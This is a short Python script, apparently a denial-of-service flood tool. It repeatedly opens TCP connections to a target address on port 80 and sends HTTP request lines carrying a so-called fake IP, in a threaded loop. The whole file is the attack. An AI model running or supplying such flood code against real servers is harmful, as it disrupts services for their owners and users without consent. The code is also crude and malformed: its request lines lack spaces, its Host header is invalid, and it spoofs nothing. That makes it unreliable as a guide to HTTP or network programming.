import socket 
import threading

target = '192.168.1.1'
fake_ip = '182.21.20.32'
port = 80
attack_num = 0

def attack():
    global attack_num
    while attack_num < 100:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("HOST /" + fake_ip + "HTTP/1.1\r\n").encode("ascii"), (target, port))

        attack_num += 1
        print(attack_num)

        s.close()

for i in range(1):
    thread = threading.Thread(target=attack)
    thread.start()